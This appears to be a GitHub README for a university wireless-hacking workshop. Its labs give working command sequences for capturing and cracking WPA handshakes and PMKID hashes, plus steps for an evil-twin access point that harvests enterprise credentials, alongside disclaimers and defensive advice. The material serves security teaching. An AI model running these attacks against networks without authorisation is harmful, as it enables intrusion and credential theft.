# 🛡️ Wireless Hacking Workshop

> A comprehensive 4-hour cybersecurity workshop exploring modern wireless attack techniques and defense strategies. Designed for the Diploma in Cybersecurity & Digital Forensics program.

[![Shell Script](https://img.shields.io/badge/Language-Shell-121011?logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![License](https://img.shields.io/badge/License-Educational-blue)](#disclaimer)
[![Last Updated](https://img.shields.io/badge/Updated-2026--04--02-brightgreen)](#)

---

## 📋 Overview

This repository contains comprehensive materials for understanding wireless network security, including:
- 🎓 Hands-on lab exercises
- 🎬 Professional presentation slides
- 🔧 Attack demonstration scripts
- 📚 Detailed technical documentation

---

## 🎯 What You'll Learn

| Topic | Focus |
|-------|-------|
| **WPA Cracking** | Dictionary attacks and handshake capture |
| **WPA2 PMKID** | Frameless attack methodology |
| **WPA2 Enterprise** | Evil Twin attacks & credential harvesting |
| **Defensive Security** | Best practices and mitigation strategies |

---

## 🖥️ System Requirements

### Operating System
- **Linux** distributions (Ubuntu 18.04+ recommended)

### Prerequisites
- **Bash 4.0+**
- Compatible wireless adapter (monitor mode support)

### Required Tools
Install via package manager:
```bash
sudo apt-get update
sudo apt-get install aircrack-ng hashcat hcxdumptool hostapd
```

**Individual Installation:**
- [`aircrack-ng`](https://www.aircrack-ng.org/) - Wireless auditing
- [`hashcat`](https://hashcat.net/) - Password cracking
- [`hcxdumptool`](https://github.com/ZerBea/hcxdumptool) - PMKID capture
- [`hostapd`](https://w1.fi/hostapd/) - Rogue AP creation

---

## 📁 Repository Structure

```
Wireless-Hacking/
├── 📊 slides/                       # Presentation materials
│   ├── Redteecon-Slides.pptx       # Final workshop presentation
│   ├── Wireless_Hacking_slides.pptx # Extended version
│   └── Wireless_Hacking_FYP_slides.pptx
├── 🧪 labs/                         # Lab exercises
│   ├── Wireless_Hacking_Lab_Student_Guide.docx
│   └── Wireless_Hacking_Lab_Student_Handout.docx
├── 📚 resources/                    # Supporting materials & commands
├── 🔧 wireless-attack.sh            # Main attack automation script
├── 📝 SECURITY_REVIEW.md            # Security documentation
└── README.md                        # This file
```

---

## 🚀 Quick Start

### 1. Clone the Repository
```bash
git clone https://github.com/ayeitsjonny/Wireless-Hacking.git
cd Wireless-Hacking
```

### 2. Install Dependencies
```bash
sudo apt-get install aircrack-ng hashcat hcxdumptool hostapd
```

### 3. Run the Main Script
```bash
chmod +x wireless-attack.sh
bash wireless-attack.sh
```

---

## 📖 Lab Exercises

### Lab 1️⃣ — WPA Dictionary Attack
**Objective:** Crack WPA-protected wireless networks

```bash
# Put adapter in monitor mode
sudo airmon-ng start wlan0

# Scan networks
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c [channel] -w capture --bssid [BSSID] wlan0mon

# Crack password
sudo aircrack-ng -w rockyou.txt -b [BSSID] capture-01.cap
```

**Key Concepts:**
- ✅ Monitor mode activation
- ✅ Handshake capture
- ✅ Dictionary-based attacks

---

### Lab 2️⃣ — WPA2 PMKID Attack
**Objective:** Capture and crack PMKID hashes (no client needed)

```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist=targets.txt

# Convert format
hcxpcapngtool -o hashes.hc22000 capture.pcapng

# Crack with Hashcat
hashcat -m 22000 -a 0 hashes.hc22000 rockyou.txt
```

**Key Concepts:**
- ✅ PMKID frame capture
- ✅ Frameless attack methodology
- ✅ Offline hash cracking

---

### Lab 3️⃣ — WPA2 Enterprise Evil Twin
**Objective:** Create rogue AP and harvest credentials

**Steps:**
1. Deploy hostapd-mana with spoofed SSID
2. Force client deauthentication
3. Capture NETNTLM credentials
4. Crack offline with John/Hashcat

**Key Concepts:**
- ✅ Rogue access point setup
- ✅ Credential interception
- ✅ Advanced attack techniques

---

## 📊 Expected Outputs

Depending on your environment, you can expect:

```
✓ Packet capture logs and statistics
✓ Cracking attempt progress and results
✓ Target network assessment reports
✓ Credential dumps (in authorized environments)
✓ Hash formats and cracking times
```

---

## 🛠️ Script Reference

For detailed command reference, see [`resources/commands.md`](resources/commands.md)

Example scripts included:
- `wireless-attack.sh` - Full attack automation
- Various utility scripts for specific attacks

---

## ⚠️ Legal & Ethical Guidelines

### Disclaimer
**Use these materials responsibly.** Unauthorized access to networks is:
- ❌ **Illegal** under computer fraud laws
- ❌ **Unethical** and violates privacy
- ❌ Subject to serious legal consequences

### Before Testing
- ✅ Obtain written permission from network owner
- ✅ Test only on authorized networks/labs
- ✅ Follow ethical hacking code of conduct
- ✅ Document all findings responsibly
- ✅ Report vulnerabilities through proper channels

---

## 🔒 Defensive Recommendations

- Use **WPA3** where available
- Implement **MAC filtering** and network segmentation
- Deploy **intrusion detection systems (IDS)**
- Regular **firmware updates** on access points
- Strong **passphrase policies** (16+ characters)
- Disable **WPS** functionality
- Monitor for **rogue access points**

---

## 📚 References & Resources

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/doku.php)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [802.11 Security Standards](https://en.wikipedia.org/wiki/IEEE_802.11w)
- [OWASP Wireless Security](https://owasp.org/)

---

## 📝 License & Attribution

This workshop material was created for educational purposes as part of a Final Year Project (FYP) to inspire students in cybersecurity and digital forensics.

**Author:** [@ayeitsjonny](https://github.com/ayeitsjonny)  
**Repository:** [Wireless-Hacking](https://github.com/ayeitsjonny/Wireless-Hacking)

---

## 💬 Questions or Feedback?

Feel free to open an issue or discussion for:
- 🐛 Bug reports
- 💡 Feature requests
- ❓ Technical questions
- 📢 Feedback & suggestions

---

**Remember:** With great power comes great responsibility. Use these skills ethically and legally.